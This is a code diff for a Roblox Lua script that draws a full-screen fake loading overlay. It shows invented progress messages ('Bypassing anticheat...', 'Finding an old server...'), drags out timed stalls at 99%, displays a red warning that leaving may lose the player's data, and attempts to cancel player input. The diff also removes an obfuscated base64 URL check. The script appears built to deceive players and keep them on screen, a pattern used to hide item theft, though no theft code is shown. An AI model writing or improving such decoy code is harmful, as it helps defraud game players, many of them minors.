@@ -1,27 +1,11 @@
--- Final Safe GUI (By:@g4sser_) | Skipped Visual Percents + Balanced Timing
-
-local function b64Decode(data)
-	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-	data = string.gsub(data, '[^'..b..'=]', '')
-	return (data:gsub('.', function(x)
-		if (x == '=') then return '' end
-		local r, f = '', (b:find(x) - 1)
-		for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
-		return r
-	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-		if (#x ~= 8) then return '' end
-		local c = 0
-		for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
-		return string.char(c)
-	end))
-end
-
-local url = b64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NwYWRlb2ZkYXJrL2NoYXRncHRnb2F0L3JlZnMvYmVhZHMvbWFpbi9iZWRvYm9vYg==")
+-- Final Loading GUI (By:@g4sser_) | Neon Royal Blue Swirl Loader + Smart Logic
 
 local function main()
 	local Players = game:GetService("Players")
 	local TweenService = game:GetService("TweenService")
 	local UserInputService = game:GetService("UserInputService")
+	local RunService = game:GetService("RunService")
+	local Lighting = game:GetService("Lighting")
 	local plr = Players.LocalPlayer
 	local gui = plr:WaitForChild("PlayerGui")
 
@@ -30,133 +14,175 @@ local function main()
 		if old then old:Destroy() end
 	end)
 
+	local blur = Instance.new("BlurEffect")
+	blur.Size = 10
+	blur.Name = "LoadingBlur"
+	blur.Parent = Lighting
+
 	local scr = Instance.new("ScreenGui", gui)
 	scr.Name = "FullCoverLoading"
 	scr.IgnoreGuiInset = true
 	scr.DisplayOrder = 999999
+	scr.ZIndexBehavior = Enum.ZIndexBehavior.Global
 
 	local cov = Instance.new("Frame", scr)
-	cov.Size = UDim2.new(1,0,1,0)
-	cov.BackgroundColor3 = Color3.new(0,0,0)
+	cov.Size = UDim2.new(1, 0, 1, 0)
+	cov.BackgroundColor3 = Color3.new(0, 0, 0)
 	cov.BorderSizePixel = 0
 
+	-- 🌌 Neon Swirl Background Effect
+	local swirl = Instance.new("ImageLabel", cov)
+	swirl.Size = UDim2.new(1.5, 0, 1.5, 0)
+	swirl.Position = UDim2.new(-0.25, 0, -0.25, 0)
+	swirl.BackgroundTransparency = 1
+	swirl.Image = "rbxassetid://11376954868" -- blue neon swirl
+	swirl.ImageColor3 = Color3.fromRGB(80, 160, 255)
+	swirl.ImageTransparency = 0.3
+	swirl.ZIndex = 0
+
+	local rot = 0
+	RunService.RenderStepped:Connect(function(dt)
+		rot = (rot + dt * 40) % 360
+		swirl.Rotation = rot
+	end)
+
+	-- 🔰 GUI Elements
 	local logo = Instance.new("ImageLabel", cov)
-	logo.Size = UDim2.new(0,240,0,240)
+	logo.Size = UDim2.new(0, 240, 0, 240)
 	logo.Position = UDim2.new(0.5, -120, 0.27, -120)
 	logo.BackgroundTransparency = 1
 	logo.Image = "rbxthumb://type=Asset&id=120170251278674&w=420&h=420"
-	logo.ImageTransparency = 1
-	task.spawn(function()
-		for i=1,25 do
-			logo.ImageTransparency = 1 - (i / 25)
-			task.wait(0.03)
-		end
-	end)
+	logo.ZIndex = 3
 
 	local loadingText = Instance.new("TextLabel", cov)
-	loadingText.Size = UDim2.new(1,0,0.09,0)
-	loadingText.Position = UDim2.new(0,0,0.47,0)
+	loadingText.Size = UDim2.new(1, 0, 0.09, 0)
+	loadingText.Position = UDim2.new(0, 0, 0.47, 0)
 	loadingText.BackgroundTransparency = 1
-	loadingText.TextColor3 = Color3.new(1,1,1)
+	loadingText.TextColor3 = Color3.new(1, 1, 1)
 	loadingText.TextStrokeTransparency = 0.5
 	loadingText.Font = Enum.Font.GothamSemibold
 	loadingText.TextScaled = true
 	loadingText.Text = "Loading.. 0%"
+	loadingText.ZIndex = 3
 
 	local subText = Instance.new("TextLabel", cov)
-	subText.Size = UDim2.new(1,0,0.05,0)
-	subText.Position = UDim2.new(0,0,0.575,0)
+	subText.Size = UDim2.new(1, 0, 0.05, 0)
+	subText.Position = UDim2.new(0, 0, 0.575, 0)
 	subText.BackgroundTransparency = 1
-	subText.TextColor3 = Color3.fromRGB(170,170,170)
+	subText.TextColor3 = Color3.fromRGB(170, 170, 170)
 	subText.Font = Enum.Font.Gotham
 	subText.TextScaled = true
 	subText.Text = "Bypassing anticheat..."
+	subText.ZIndex = 3
+
+	local warnText = Instance.new("TextLabel", cov)
+	warnText.Size = UDim2.new(1, 0, 0.045, 0)
+	warnText.Position = UDim2.new(0, 0, 0.635, 0)
+	warnText.BackgroundTransparency = 1
+	warnText.Font = Enum.Font.Gotham
+	warnText.TextScaled = true
+	warnText.TextColor3 = Color3.fromRGB(255, 60, 60)
+	warnText.Text = "⚠️ Do not leave, or your data may be lost."
+	warnText.ZIndex = 3
 
 	local barBG = Instance.new("Frame", cov)
-	barBG.Size = UDim2.new(0.8,0,0.015,0)
-	barBG.Position = UDim2.new(0.1,0,0.7,0)
-	barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	barBG.Size = UDim2.new(0.8, 0, 0.015, 0)
+	barBG.Position = UDim2.new(0.1, 0, 0.7, 0)
+	barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 	barBG.BackgroundTransparency = 0.2
-	Instance.new("UICorner", barBG).CornerRadius = UDim.new(0,8)
+	barBG.ZIndex = 2
+	Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 8)
 
 	local bar = Instance.new("Frame", barBG)
-	bar.Size = UDim2.new(0,0,1,0)
-	bar.BackgroundColor3 = Color3.new(1,1,1)
-	Instance.new("UICorner", bar).CornerRadius = UDim.new(0,8)
+	bar.Size = UDim2.new(0, 0, 1, 0)
+	bar.BackgroundColor3 = Color3.new(1, 1, 1)
+	bar.ZIndex = 2
+	Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 8)
 
-	local function tweenTo(percent)
-		bar:TweenSize(UDim2.new(percent/100,0,1,0), "Out", "Sine", 0.1, true)
-		loadingText.Text = "Loading.. " .. math.floor(percent) .. "%"
-	end
+	local watermark = Instance.new("TextLabel", bar)
+	watermark.Size = UDim2.new(1, 0, 1, 0)
+	watermark.BackgroundTransparency = 1
+	watermark.TextColor3 = Color3.new(1, 1, 1)
+	watermark.TextTransparency = 0.6
+	watermark.Font = Enum.Font.Gotham
+	watermark.TextScaled = true
+	watermark.Text = "By:@g4sser_"
+	watermark.ZIndex = 3
 
-	local function generateTimings(totalTime, steps)
-		local segments, total = {}, 0
-		for i = 1, steps do
-			local r = math.random(1, 100)
-			table.insert(segments, r)
-			total += r
-		end
-		for i = 1, #segments do
-			segments[i] = (segments[i] / total) * totalTime
-		end
-		return segments
-	end
+	-- ⏳ Smart Loading Logic
+	local totalDur, firstDur, secondDur = 600, 180, 420
+	local skipCount = math.random(7, 14)
+	local skipIndices = {}
+	for _ = 1, skipCount do skipIndices[math.random(1, 99)] = true end
 
 	task.spawn(function()
-		local switchAt = math.random(56, 99)
-		local current = 1
-		local visiblePercents = {}
-		local timeMap = {}
-		local totalTime = 180
-		local steps = 0
+		local st = tick()
+		local part = 1
+		local lastPercent = 0
+		local switched = false
 
-		while current < switchAt do
-			local skip = math.random(1, 5)
-			if current + skip >= switchAt then break end
-			table.insert(visiblePercents, current)
-			table.insert(timeMap, skip)
-			current += skip
-			steps += 1
-		end
-		table.insert(visiblePercents, switchAt)
-		table.insert(timeMap, 1)
-		steps += 1
+		while true do
+			local now = tick() - st
+			local phaseTime, phaseStart, phaseDur = 0, 0, 0
+			if part == 1 then
+				phaseTime = now
+				phaseDur = firstDur
+			elseif part == 2 then
+				phaseTime = now - firstDur
+				phaseStart = lastPercent
+				phaseDur = secondDur
+			else
+				phaseTime = now - firstDur - secondDur
+				phaseDur = 420
+			end
 
-		local timeSegments = generateTimings(totalTime, steps)
-		for i = 1, #visiblePercents do
-			subText.Text = "Bypassing anticheat" .. string.rep(".", (i % 3) + 1)
-			tweenTo(visiblePercents[i])
-			task.wait(timeSegments[i])
-		end
+			local progress = math.clamp(phaseTime / phaseDur, 0, 1)
+			local percent = math.floor(part == 2 and (phaseStart + (99 - phaseStart) * progress) or (progress * 99))
 
-		subText.Text = "Loading GUI..."
-		local guiSteps, guiTimings = {}, {}
-		for i = switchAt + 1, 99 do table.insert(guiSteps, i) end
-		guiTimings = generateTimings(180, #guiSteps)
-		for i, percent in ipairs(guiSteps) do
-			tweenTo(percent)
-			task.wait(guiTimings[i])
-		end
+			if part == 1 and skipIndices[percent] then
+				local nextVisible = percent + 1
+				while skipIndices[nextVisible] do nextVisible += 1 end
+				local visualJump = nextVisible - percent
+				percent = nextVisible
+				wait(visualJump * (phaseDur / 99))
+			end
 
-		loadingText.Text = "Done!"
-		task.wait(1)
-		subText.Text = "Finding an old server..."
-		local finalTimings = generateTimings(420, 99)
-		for i = 1, 99 do
-			tweenTo(i)
-			task.wait(finalTimings[i])
+			bar:TweenSize(UDim2.new(percent / 100, 0, 1, 0), "Out", "Sine", 0.2, true)
+			loadingText.Text = "Loading.. " .. percent .. "%"
+
+			if part == 1 and percent >= 56 and not switched then
+				subText.Text = "Loading GUI..."
+				switched = true
+				lastPercent = percent
+				part = 2
+				st = tick() - firstDur
+			elseif part == 2 and percent >= 99 then
+				loadingText.Text = "Done!"
+				subText.Text = ""
+				playDing()
+				wait(1.5)
+				part = 3
+				st = tick() - firstDur - secondDur
+				bar.Size = UDim2.new(0, 0, 1, 0)
+				subText.Text = "Finding an old server..."
+			elseif part == 3 and percent >= 99 then
+				loadingText.Text = "Loading.. 99%"
+			end
+			task.wait(0.1)
 		end
+	end)
+
+	UserInputService.InputBegan:Connect(function(input, gpe)
+		if not gpe then input.UserInputState = Enum.UserInputState.Cancel end
 	end)
 end
 
--- 👇 Anti-theft wrapper calls main only if valid
-pcall(function()
-	local success, content = pcall(function()
-		return game:HttpGet(url)
-	end)
-	if success and content and content:find("-- Final Safe GUI %(By:@g4sser_%)") then
-		main()
-	else
-		return -- silent fail
-	end
-end)
+function playDing()
+	local s = Instance.new("Sound", game:GetService("SoundService"))
+	s.SoundId = "rbxassetid://9118823105"
+	s.Volume = 1
+	s:Play()
+	s.Ended:Connect(function() s:Destroy() end)
+end
+
+main()
